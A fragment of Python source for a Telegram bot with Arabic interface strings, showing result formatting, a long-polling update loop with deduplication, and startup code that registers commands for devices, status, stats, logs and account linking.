    result_str = result_data if isinstance(result_data, str) else json.dumps(result_data, ensure_ascii=False, default=str)
    
    # Check if result is a base64 image
    is_image = isinstance(result_str, str) and len(result_str) > 10000 and result_str.startswith('/9j/')
    
    if is_image:
        try:
            import base64
            img_bytes = base64.b64decode(result_str)
            await send_photo(chat_id, img_bytes, caption=f"📸 {cmd_name}")
        except Exception:
            # If decode fails, send truncated text
            await send_message(chat_id, f"✅ <b>{cmd_name}</b>\n\nنتيجة طويلة جداً لعرضها.")
    elif len(result_str) > 4000:
        await send_message(chat_id, f"✅ <b>{cmd_name}</b>\n\n{result_str[:4000]}...")
    elif result_str:
        await send_message(chat_id, f"✅ <b>{cmd_name}</b>\n\n<code>{result_str}</code>")
    else:
        await send_message(chat_id, f"✅ <b>{cmd_name}</b>\n\nتم التنفيذ بنجاح.")


# ─── Polling Loop ─────────────────────────────────────────────

async def poll_loop():
    """Main Telegram long-polling loop."""
    global tg_offset, polling_active
    polling_active = True
    
    while polling_active:
        try:
            await init_session()
            url = f"{API_BASE}/getUpdates"
            payload = {"offset": tg_offset, "timeout": 30, "allowed_updates": ["message", "callback_query"]}
            
            async with _tg_session.post(url, json=payload, timeout=ClientTimeout(total=35)) as resp:
                data = await resp.json()
            
            if not data.get('ok'):
                await asyncio.sleep(5)
                continue
            
            for update in data.get('result', []):
                update_id = update.get('update_id', 0)
                if update_id >= tg_offset:
                    tg_offset = update_id + 1
                
                # Dedup
                if update_id in store._tg_processed_updates:
                    continue
                store._tg_processed_updates.add(update_id)
                if len(store._tg_processed_updates) > 500:
                    store._tg_processed_updates = set(list(store._tg_processed_updates)[-250:])
                
                # Process message
                if 'message' in update:
                    msg = update['message']
                    chat_id = msg.get('chat', {}).get('id')
                    text = msg.get('text', '')
                    message_id = msg.get('message_id', 0)
                    from_user = msg.get('from', {})
                    if text:
                        await handle_message(chat_id, text, message_id, from_user)
                
                # Process callback query
                elif 'callback_query' in update:
                    cb = update['callback_query']
                    chat_id = cb.get('message', {}).get('chat', {}).get('id')
                    callback_data = cb.get('data', '')
                    cb_id = cb.get('id', '')
                    if callback_data:
                        await handle_callback(chat_id, callback_data, cb_id)
        
        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"TG poll error: {e}")
            await asyncio.sleep(5)


async def start_bot():
    """Start the Telegram bot polling."""
    global bot_username

    # Fetch the bot username dynamically via getMe — used for building
    # deep-link URLs (https://t.me/<bot_username>?start=<token>) for the
    # account-linking flow. Cached globally so api_handlers can expose it.
    try:
        me = await api_call("getMe", {})
        if me and me.get('ok') and me.get('result', {}).get('username'):
            bot_username = me['result']['username']
            logger.info(f"Telegram bot username: @{bot_username}")
        else:
            logger.warning(f"getMe did not return username: {me}")
    except Exception as e:
        logger.warning(f"Failed to fetch bot username via getMe: {e}")

    # Set bot commands
    await api_call("setMyCommands", {
        "commands": [
            {"command": "start", "description": "القائمة الرئيسية / ربط الحساب"},
            {"command": "help", "description": "قائمة الأوامر"},
            {"command": "devices", "description": "قائمة الأجهزة"},
            {"command": "link", "description": "كود الربط الخاص بك (دائم)"},
            {"command": "status", "description": "حالة الخادم"},
            {"command": "stats", "description": "الإحصائيات"},
            {"command": "logs", "description": "آخر السجلات"},
            {"command": "settings", "description": "الإعدادات"},
        ]
    })
    asyncio.create_task(poll_loop())
    logger.info("Telegram bot started")